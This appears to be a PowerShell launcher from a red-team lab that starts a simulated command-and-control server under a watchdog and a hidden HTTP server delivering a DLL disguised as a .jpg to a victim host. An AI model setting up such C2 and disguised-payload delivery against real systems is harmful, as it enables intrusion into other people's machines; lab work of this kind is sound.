<#
.SYNOPSIS
Start (or stop) the phase-1 lab servers on the C2/attacker host:
  - C2-SIM v3 (scripts/c2sim.py) on C2Port
  - a simple HTTP server (python http.server) serving a publish dir with the DLL
Run this on Kali or the host LAN to the lab. The victim WS01 must reach both.

.PARAMETER C2Ip        IP to bind C2-SIM (e.g. 192.168.50.100).
.PARAMETER C2Port      C2-SIM port (default 8080).
.PARAMETER PublishDir  Directory containing the DLL (c0015-comparefor.jpg) to serve.
.PARAMETER HttpPort    HTTP download port (default 8000).
.PARAMETER LedgerDir   Where C2-SIM writes ART-07 receipts (default evidence\run-ledger).
.PARAMETER LogPath     C2-SIM log file (default c2sim.log).
.PARAMETER Stop        Stop previously started servers (read pid file).
.PARAMETER PidFile     File to record started PIDs (default .phase1-servers.pid).
.PARAMETER GuardState  Watchdog state file holding the CURRENT c2sim child PID (G8).
.PARAMETER GuardStopFlag  Stop-flag file watched by the watchdog.
.PARAMETER GuardErrLog  Watchdog + child stderr capture file (crash diagnostics; G8).
.EXAMPLE
pwsh -File payloads/packaging/launch_servers.ps1 -C2Ip 192.168.50.100 -PublishDir build/out -Start
#>
param(
    [string]$C2Ip,
    [int]$C2Port = 8080,
    [string]$PublishDir,
    [int]$HttpPort = 8000,
    [string]$LedgerDir = 'evidence/run-ledger',
    [string]$LogPath = 'c2sim.log',
    [switch]$Stop,
    [string]$PidFile = '.phase1-servers.pid',
    [string]$GuardState = '.c2sim-child.pid',
    [string]$GuardStopFlag = '.c2sim.stop',
    [string]$GuardErrLog = 'c2sim.err.log'
)
$ErrorActionPreference = 'Stop'
if (-not $Stop -and (-not $C2Ip -or -not $PublishDir)) { throw '-C2Ip and -PublishDir are required unless -Stop' }
$repo = (Get-Item (Join-Path $PSScriptRoot '..\..')).FullName   # repo root (two up from payloads\packaging)
$c2sim = Join-Path $repo 'scripts/c2sim.py'
$guard = Join-Path $repo 'scripts/c2sim_guard.py'
$pub = [IO.Path]::GetFullPath((Join-Path $repo $PublishDir))

function Stop-ListenersOnPort {
    param([int[]]$Ports)
    foreach ($port in $Ports) {
        Get-NetTCPConnection -State Listen -LocalPort $port -ErrorAction SilentlyContinue |
            ForEach-Object { Stop-Process -Id $_.OwningProcess -Force -ErrorAction SilentlyContinue }
    }
}

if ($Stop) {
    # G8: stop the watchdog first via its stop flag, then kill guard + current
    # child pid (child changes on every respawn) + HTTP server; port sweep as fallback.
    if (Test-Path -LiteralPath $GuardStopFlag) { Remove-Item -LiteralPath $GuardStopFlag -Force -ErrorAction SilentlyContinue }
    Set-Content -LiteralPath $GuardStopFlag -Value 'stop' -Encoding ASCII
    if (Test-Path -LiteralPath $PidFile) {
        Get-Content -LiteralPath $PidFile | ForEach-Object {
            $pidVal = [int]$_
            if ($pidVal -gt 0) { Stop-Process -Id $pidVal -Force -ErrorAction SilentlyContinue }
        }
        Remove-Item -LiteralPath $PidFile -Force -ErrorAction SilentlyContinue
    }
    $childPid = [int](Get-Content -LiteralPath $GuardState -ErrorAction SilentlyContinue | Select-Object -First 1)
    if ($childPid -gt 0) { Stop-Process -Id $childPid -Force -ErrorAction SilentlyContinue }
    Remove-Item -LiteralPath $GuardState -Force -ErrorAction SilentlyContinue
    Remove-Item -LiteralPath $GuardStopFlag -Force -ErrorAction SilentlyContinue
    Stop-ListenersOnPort -Ports @($C2Port, $HttpPort)
    Write-Output "stopped servers (watchdog + c2sim + http; stopped)"
    return
}

if (-not (Test-Path -LiteralPath $c2sim)) { throw "c2sim not found: $c2sim" }
if (-not (Test-Path -LiteralPath $pub)) { throw "publish dir not found: $pub" }

# ---- pre-flight cleanup: kill ANY existing listener on our ports ----
# Repeated launches without -Stop leave old python servers bound to the same
# ports (Python allows re-binding). New connections then land on stale
# instances (old code, no dedup) and corrupt the run evidence.
Stop-ListenersOnPort -Ports @($C2Port, $HttpPort)
Start-Sleep -Milliseconds 1500   # let the killed listeners fully release the ports (bind race)
Remove-Item -LiteralPath $PidFile -Force -ErrorAction SilentlyContinue
Remove-Item -LiteralPath $GuardState -Force -ErrorAction SilentlyContinue
Remove-Item -LiteralPath $GuardStopFlag -Force -ErrorAction SilentlyContinue

$pids = New-Object System.Collections.Generic.List[int]

# G8: run C2-SIM under the watchdog (c2sim_guard.py) - respawn on exit, stderr
# captured to c2sim.err.log, current child pid in $GuardState for -Stop.
$guardArgs = "scripts/c2sim_guard.py --cmd ""python scripts/c2sim.py --ip $C2Ip --port $C2Port --ledger $LedgerDir --log $LogPath"" --state $GuardState --stopflag $GuardStopFlag --log $GuardErrLog"
$p1 = Start-Process python -ArgumentList $guardArgs -PassThru -WindowStyle Hidden
$pids.Add($p1.Id)

$p2 = Start-Process python -ArgumentList ("-m http.server $HttpPort --directory `"$pub`" --bind $C2Ip") -PassThru -WindowStyle Hidden
$pids.Add($p2.Id)

$pids | Set-Content -LiteralPath $PidFile -Encoding ASCII
Write-Output "started:"
Write-Output "  C2-SIM   http://$C2Ip`:$C2Port  (watchdog: scripts/c2sim_guard.py; log: $LogPath; crashes: $GuardErrLog)"
Write-Output "  HTTP DLL http://$C2Ip`:$HttpPort"
Write-Output "  pid file: $PidFile  (stop later with -Stop; watchdog child pid: $GuardState)"
Start-Sleep -Seconds 1
Write-Output "  verify C2-SIM: $C2Ip`:$C2Port reachable; DLL at http://$C2Ip`:$HttpPort/c0015-comparefor.jpg"
